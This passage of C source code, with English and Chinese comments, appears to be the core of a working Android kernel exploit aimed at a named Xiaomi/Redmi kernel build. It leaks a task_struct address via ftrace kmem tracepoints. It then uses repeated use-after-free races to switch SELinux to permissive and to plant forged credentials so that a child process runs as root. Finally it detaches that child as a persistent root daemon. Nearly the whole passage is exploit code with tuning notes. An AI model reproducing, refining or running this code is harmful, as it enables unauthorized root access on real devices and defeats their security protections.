		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

/*
 * Fixed-size frequency table used only for the failure diagnostics below.
 * Small on purpose: the point is to show the handful of dominant sizes /
 * call sites in the capture window, not to be a real histogram.
 */
struct freq {
	uint64_t key;
	uint32_t n;
};

static void freq_add(struct freq *table, int cap, int *used, uint64_t key)
{
	int i, min;
	for (i = 0; i < *used; i++) {
		if (table[i].key == key) {
			table[i].n++;
			return;
		}
	}
	if (*used < cap) {
		table[*used].key = key;
		table[*used].n = 1;
		(*used)++;
		return;
	}
	min = 0;
	for (i = 1; i < cap; i++)
		if (table[i].n < table[min].n)
			min = i;
	table[min].key = key;
	table[min].n = 1;
}

static void freq_dump(const char *tag, const struct freq *table, int used)
{
	int i;
	dprintf(STDOUT_FILENO, "[task] %s=", tag);
	if (!used)
		dprintf(STDOUT_FILENO, "none");
	for (i = 0; i < used; i++)
		dprintf(STDOUT_FILENO, "%s%#" PRIx64 ":%u", i ? " " : "",
			table[i].key, table[i].n);
	dprintf(STDOUT_FILENO, "\n");
}

/*
 * Locate the task_struct that fork() just allocated.
 *
 * Two keys, in this order:
 *   1. call_site == copy_process+0x140 (profile task_alloc_link). The kmem
 *      tracepoint records _RET_IP_, which for the fork path is the return
 *      address of the kmem_cache_alloc_node() call in copy_process -- a
 *      constant per kernel build and *independent of the slab object size*.
 *   2. bytes_req == sizeof(struct task_struct) -- the historical key, kept
 *      for profiles that predate task_alloc_link (blob < v3).
 *
 * Key 1 exists because on Xiaomi 6.6.118 the size key returned
 * "[task] hits=0 foreign=0": not "wrong pid", but no size match at all.
 * Matching on the call site removes the size assumption entirely.
 */
/* task_struct 缓存的实际尺寸不等于 BTF 里的 sizeof(struct task_struct)。
 *
 * kernel/fork.c:
 *   task_struct_cachep = kmem_cache_create_usercopy("task_struct",
 *           arch_task_struct_size, align,      // align = 0x40
 *           SLAB_PANIC|SLAB_ACCOUNT, useroffset, usersize, NULL);
 *
 * arch_task_struct_size 是 .data 里的运行时变量，本机（红米 K90 至尊
 * 6.6.118-g0908354dac1b / warsaw）地址 0xffffffc08211ae08，镜像初值 0。
 * 实测它只有两个写入点（反汇编 fork_init 段得到，均已核对）：
 *   0xffffffc081d004f4  mov w9,#0x12c0 ; str w9,[x8,#0xe08]      ; 默认值
 *   0xffffffc081d00468  add w8,w8,w9 (w9=0x12c0) ; str w8,[x8]   ; 厂商扩展
 * 后者先用 `cmp x0,#0x400 ; b.ls` 限定追加量上限；超限直接返回 -ENOENT，
 * 不落变量。⇒ object_size = 0x12c0 + extra，extra ∈ [0, 0x400]。
 *
 * 所以 BTF 的 4800 只是 object_size 的下界，slab 记录里的
 *   bytes_req   = s->object_size ∈ [4800, 4800+0x400]
 *   bytes_alloc = ALIGN(object_size, 0x40) 同样落在该窗口内。
 * 用 == TASK_STRUCT_SIZE 精确匹配，在带厂商扩展的内核上会 hits=0。
 *
 * 窗口是安全的：kmalloc 桶里 4096 与 8192 之间没有其它尺寸，fork 期间
 * 也不会有别的专用缓存的 object_size 落在 4800..5824。
 */
#define TASK_VENDOR_EXTRA_MAX 0x400U

/*
 * task_struct slab object_size 的基准值。
 *
 * 优先用运行期实测值（calib_a 的分配点探测落盘 task_size.txt）：BTF 的
 * sizeof(struct task_struct) 只是下界 —— CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌
 * 进 task_struct，真机 6.18 实测 4736(BTF) + 1024(THREAD_SIZE) = 5760。
 * 没有实测值时才退回 profile 的值（此时沿用「厂商扩展 ≤ 0x400」的旧窗口）。
 */
static uint64_t task_size_base(void)
{
	return TASK_SIZE_RT ? TASK_SIZE_RT : (uint64_t)TASK_STRUCT_SIZE;
}

static int task_size_in_window(uint64_t v)
{
	uint64_t base = task_size_base();

	if (!base)
		return 0;
	return v >= base && v <= base + TASK_VENDOR_EXTRA_MAX;
}

static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0, by_size = 0, by_site = 0, foreign = 0, other = 0;
	size_t scanned = 0;
	int ncpu = cpu_count();
	uint64_t want_site = SITE_TASK_RT ? SITE_TASK_RT
				: (TASK_ALLOC_LINK ? slide_addr(TASK_ALLOC_LINK) : 0);
	struct freq sizes[12];
	struct freq sites[8];
	int nsizes = 0, nsites = 0;
	uint64_t max_alloc = 0, max_site = 0;
	int have_site = 0;

	if (pipe(g_wake) || pipe(g_report))
		return -1;
	/*
	 * 顺序很重要：**先开 tracing，再 arm**。
	 *
	 * rss_stat 是**边沿触发**：kmem_cache_alloc 的 enable 靠
	 * "enable_event:kmem:kmem_cache_alloc" 挂在 rss_stat 上，rss_stat 真正
	 * 触发一次，事件才被打开。而 tracepoint 只有在 tracing_on=1 时才会被
	 * 记录 —— tracing 关着的时候 kick_rss 推多少 RSS 都不会有 rss_stat 记录，
	 * 事件就永远 enable 不上，采集到 0 条（`[uaf] captured=0 chosen=0 raw=0`）。
	 *
	 * 真机上 uid 2000 直接写 events 下的 enable 文件是**被拒**的（日志里
	 * `armed=trigger enable=?`，写失败、读也读不回来），所以只剩 trigger 这
	 * 一条路，顺序错了就必然采不到。
	 */
	if (trace_off_on() || arm_kmem_cache_alloc())
		return -1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	/* E3：复用全局 raw 缓冲（不再每次 malloc 4MB） */
	buf = raw_buf(4U << 20);
	if (!buf)
		return -1;
	if (ncpu < 1)
		ncpu = 1;
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		scanned += used;
		for (size_t i = 8; i + 40 <= used; i++) {
			uint64_t site, ptr, req, alloc;
			uint32_t owner;
			int match, szok;
			/* raw record: [trace_entry @i-8][call_site i][ptr i+8]
			 * [bytes_req i+16][bytes_alloc i+24]; trace_entry.pid
			 * (the task doing the alloc) sits at i-4.
			 * 实测 trace_event_raw_event_kmem_cache_alloc:
			 *   rec+0x18 <- s->object_size (bytes_req)
			 *   rec+0x20 <- s->size        (bytes_alloc) */
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 16, 8);
			memcpy(&alloc, buf + i + 24, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			if (req < 8 || req > (1U << 22))
				continue;
			/* s->size 必然按 align(0x40) 对齐；object_size 不一定 */
			szok = task_size_in_window(req) ||
			       (task_size_in_window(alloc) && !(alloc & 63));
			memcpy(&owner, buf + i - 4, 4);
			if ((pid_t)owner != getpid()) {
				if (szok)
					foreign++;
				continue;
			}
			freq_add(sizes, 12, &nsizes, alloc);
			freq_add(sites, 8, &nsites, site);
			/* fork 过程中最大的那次 slab 分配就是 task_struct；
			 * 这个值能直接告诉我们本机 arch_task_struct_size 是多少。 */
			if (alloc >= 8 && alloc <= (1U << 20) && alloc > max_alloc) {
				max_alloc = alloc;
				max_site = site;
			}
			if (want_site && site == want_site) {
				match = 1;
				by_site++;
			} else if (szok) {
				match = 2;
				by_size++;
			} else {
				match = 0;
				other++;
			}
			if (!match)
				continue;
			/* call_site 命中是确定性的，优先级高于尺寸窗口；
			 * 一旦拿到 site 命中，就不再让尺寸兜底覆盖它。 */
			if (match == 1) {
				g_task = ptr;
				have_site = 1;
			} else if (!have_site) {
				g_task = ptr;
			}
			hits++;
			dprintf(STDOUT_FILENO,
				"[task] pid=%u by=%s site=%#" PRIx64 " ptr=%#" PRIx64
				" req=%" PRIu64 " alloc=%" PRIu64 "\n",
				owner, match == 1 ? "site" : "size", site, ptr,
				req, alloc);
		}
	}
	/* E3：缓冲由 raw_buf 持有，不在此释放 */
	disarm_kmem_cache_alloc();
	write_file(TRACE "/tracing_on", "0\n");
	dprintf(STDOUT_FILENO,
		"[task] hits=%d by_site=%d by_size=%d foreign=%d other=%d task=%#" PRIx64
		" raw=%zu cpus=%d size=%" PRIu64 "..%" PRIu64 " want_site=%#" PRIx64
		" max_alloc=%" PRIu64 "@%#" PRIx64 "\n",
		hits, by_site, by_size, foreign, other, g_task, scanned, ncpu,
		task_size_base(), task_size_base() + TASK_VENDOR_EXTRA_MAX, want_site,
		max_alloc, max_site);
	if (!hits) {
		/* One run must be enough to tell the three failure modes apart:
		 * no records at all -> event never enabled; records but none of
		 * our sizes -> size drift; the fork site present but not matched
		 * -> something even more specific. */
		freq_dump("sizes", sizes, nsizes);
		freq_dump("sites", sites, nsites);
	}
	return hits ? 0 : -1;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[SELinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[SELinux] enforce=%s", buf);
	close(fd);
}

static int g_fast;

int pc98260_run_rootd(void);

/*
 * R1：从 uaf_plant_main 抽出的参数解析。
 *
 * 返回 daemon_exit（1 = 注入成功后主进程退出，页面交由 cred 子进程驻留）。
 * 未识别的参数维持原行为——静默忽略；宿主固定只传
 * --slide / --page-offset / --daemon-exit。
 */
static int parse_args(int argc, char **argv)
{
	int daemon_exit = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			g_slide = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--page-offset") && i + 1 < argc)
			g_page_offset = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--daemon-exit"))
			daemon_exit = 1;
	}
	return daemon_exit;
}

int uaf_plant_main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	
	// initialize offset table (from kernel_table)
	if (init_offsets() != 0) {
		fprintf(stderr, "[config] error: failed to init kernel offset table\n");
		return 1;
	}
	
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	/* --daemon-exit: after the plant succeeds, hand the pages over to a detached
	 * daemon child and let this process return, so the caller (host) is not
	 * blocked on a process that has to live forever.
	 * R1：解析逻辑已抽出为 parse_args。 */
	int daemon_exit = parse_args(argc, argv);
	dprintf(STDOUT_FILENO, "[mode] daemon_exit=%d\n", daemon_exit);
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	g_fast = getenv("PLANT_FAST") != NULL;
	dprintf(STDOUT_FILENO, "[mode] fast=%d\n", g_fast);
	log_sync();
	print_cfg();
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	/*
	 * trace 状态是**内核全局**的：进程退出、被杀、崩溃都不会自动还原。
	 * 注册 atexit + 可捕获信号，保证「无论怎么退出」都不会把抬高的
	 * 环形缓冲留在内核里（那是每次失败都要扣掉的成百上千 MiB）。
	 */
	atexit(restore_trace_state);
	{
		struct sigaction fa;
		memset(&fa, 0, sizeof(fa));
		fa.sa_handler = on_fatal_signal;
		sigemptyset(&fa.sa_mask);
		fa.sa_flags = 0;
		sigaction(SIGINT, &fa, NULL);
		sigaction(SIGTERM, &fa, NULL);
		sigaction(SIGHUP, &fa, NULL);
		sigaction(SIGQUIT, &fa, NULL);
	}
	g_mem_total_kb = read_mem_total_kb();
	dprintf(STDOUT_FILENO, "[mem] memtotal=%llu KB cpus=%d\n",
		(unsigned long long)g_mem_total_kb, cpu_count());
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	/*
	 * 父进程绑到 CRITICAL_CPU（和 exec 线程同一个核），避开 CPU 0 ——
	 * 理由见 pick_cpu 上面的注释。
	 */
	if (pin_cpu(critical_cpu()))
		return 1;
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_COLLECT)))
		dprintf(STDOUT_FILENO, "[warn] buffer_size_kb not writable, continuing\n");
	if (leak_task()) {
		dprintf(STDOUT_FILENO, "[task] leak failed\n");
		disarm();
		return 5;
	}
	g_plant_cred = 0;
	/*
	 * 注入阶段的总时间预算。
	 *
	 * 一轮 one_uaf 最坏要 ~90 s（wait_phase 30 s ×2 + stream backfill 8 s +
	 * wait_zombie 20 s），SELinux 阶段 12 轮 + cred 阶段 12 轮 = 最多 24 轮。
	 * 不设预算的话最坏能跑 **30 多分钟**，而宿主那边 INJECT 超时只有 300 s：
	 * 宿主先判失败、把原生进程留在原地继续跑，用户看到的就是「卡死在那儿不动」，
	 * 反复重试还会攒下一堆满负荷空转的进程。
	 *
	 * 每轮开始前查一次预算，到点就收手：宁可这轮失败退出，也不要让设备长时间
	 * 4 个 helper 线程 100% spin（8 核上占掉一半）。
	 */
	g_deadline = time(NULL) + EXPLOIT_BUDGET_SEC;
	{
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		for (int i = 1; i <= 12; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0)
					buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0') {
				dprintf(STDOUT_FILENO, "[selinux] already permissive\n");
				break;
			}
			if (budget_exhausted()) {
				dprintf(STDOUT_FILENO,
					"[budget] selinux phase stopped after %d attempt(s): time budget %d s exhausted\n",
					i - 1, EXPLOIT_BUDGET_SEC);
				break;
			}
			dprintf(STDOUT_FILENO,
				"[selinux] attempt %d/12 target=%#" PRIx64 "\n",
				i, sel);
			if (!one_uaf(sel))
				read_enforce();
		}
	}
	g_plant_cred = 1;
	int rooted = 0;
	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		int fixed_uid = -1, fixed_suid = -1;
		if (budget_exhausted()) {
			dprintf(STDOUT_FILENO,
				"[budget] cred phase stopped after %d attempt(s): time budget %d s exhausted\n",
				attempt - 1, EXPLOIT_BUDGET_SEC);
			break;
		}
		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
		log_sync();
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
		log_sync();
		log_proc_uid(g_cred_child_pid);
		/*
		 * 下面两个「补写 uid / suid」的循环各自最多再开 3 轮 UAF，
		 * 所以**一轮 plant 最多是 1 + 3 + 3 = 7 次 UAF**，
		 * 12 次 plant 加上 SELinux 阶段的 12 次，理论上能开到 **96 次** UAF。
		 *
		 * 每一次 UAF 都在内核的 timer 拆解路径上制造一次悬空 —— 命中内核竞态
		 * 就是 kernel panic。所以次数本身就是崩溃概率的乘数，必须一起算进预算。
		 */
		for (int i = 0; i < 3 && fixed_uid && !budget_exhausted(); i++)
			fixed_uid = one_uaf(g_cred_kva + 8);
		for (int i = 0; i < 3 && fixed_suid && !budget_exhausted(); i++)
			fixed_suid = one_uaf(g_cred_kva + 16);
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
			rooted = 1;
		else if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted) {
		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		log_sync();
		/*
		 * 失败路径：先把抬高的环形缓冲还回去。
		 * 这个进程接下来会一直挂着（host 等 rootd 超时），不能让它
		 * 顺手把上百 MiB 内核内存也一起挂住。
		 */
		restore_trace_state();
		for (;;)
			pause();
	}
	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages (parent pid=%d)\n",
		g_cred_child_pid, getpid());
	log_sync();
	/*
	 * Two exit models.
	 *
	 * --daemon-exit (the model the host uses): tell the cred child to detach
	 * itself, then return. This process must not be the one that lives forever;
	 * the child keeps the forged cred pages referenced and stays reachable for
	 * the platform (it becomes a session leader with stdio on /dev/null).
	 *
	 * Without the flag: stay resident and wait for the child (reference
	 * implementation behaviour). The stop-file forwarding below is a leftover of
	 * the old inline-rootd design - the child now blocks every signal and runs
	 * rootd in a fork, so this is a diagnostic path only.
	 */
	if (daemon_exit) {
		unsigned char daemon_cmd = 0xAA;
		if (write(g_wake[1], &daemon_cmd, 1) == 1) {
			dprintf(STDOUT_FILENO, "[cred] sent daemon command to child\n");
			log_sync();
			char ack[32];
			ssize_t got = read(g_report[0], ack, sizeof(ack) - 1);
			if (got > 0) {
				ack[got] = 0;
				dprintf(STDOUT_FILENO, "[cred] child ack: %s", ack);
			}
			close(g_wake[1]);
			close(g_report[0]);
			dprintf(STDOUT_FILENO,
				"[cred] main process exiting, child becomes daemon\n");
			return 0;
		}
		dprintf(STDOUT_FILENO, "[cred] failed to send daemon command\n");
	}
	int ticks = 0;
	int sent_term = 0;
	int term_warned = 0;
	int term_deadline = 0;
	for (;;) {
		int status = 0;
		pid_t done = waitpid(g_cred_child_pid, &status, WNOHANG);
		if (done == g_cred_child_pid) {
			dprintf(STDOUT_FILENO,
				"[cred] child exited (status=%d), releasing pages\n",
				status);
			break;
		}
		if (done < 0 && errno != EINTR) {
			dprintf(STDOUT_FILENO, "[cred] waitpid failed errno=%d\n", errno);
			break;
		}
		if (!sent_term && access(pc98260_rootd_stop_path(), F_OK) == 0) {
			(void)kill(g_cred_child_pid, SIGTERM);
			dprintf(STDOUT_FILENO,
				"[cred] stop file seen, sent SIGTERM to child %d\n",
				g_cred_child_pid);
			sent_term = 1;
			/* 15s = 75 ticks of 200ms. */
			term_deadline = ticks + 75;
		}
		if (sent_term && !term_warned && ticks >= term_deadline) {
			/* Never escalate to SIGKILL: the child still references the forged
			 * cred, so killing it would panic the kernel. Keeping the pages
			 * pinned leaks memory but keeps the device alive. */
			dprintf(STDOUT_FILENO,
				"[cred] warn: child %d ignored SIGTERM after 15s, keeping pages pinned\n",
				g_cred_child_pid);
			term_warned = 1;
		}
		/* Heartbeat: proves on the next device run whether this loop is alive
		 * and whether the child is still running (a stuck child means rootd
		 * never returned). */
		if (++ticks % 5 == 0) {
			char alive = (kill(g_cred_child_pid, 0) == 0) ? '1' : '0';
			/* ticks are 200ms each, so one second is ticks/5. The old
			 * "ticks * 5" label overstated elapsed time by 25x and made the
			 * device log read "25 s" after roughly one real second. */
			dprintf(STDOUT_FILENO,
				"[cred] waiting for child %d (alive=%c) %ds term=%d phase=%d\n",
				g_cred_child_pid, alive, ticks / 5, sent_term,
				pc98260_rootd_phase());
		}
		struct timespec nap = { .tv_sec = 0, .tv_nsec = 200000000L };
		nanosleep(&nap, NULL);
	}
	free_aio_hold();
	close_stream();
	dprintf(STDOUT_FILENO, "[uaf] exploit finished, exiting cleanly\n");
	return 0;
}
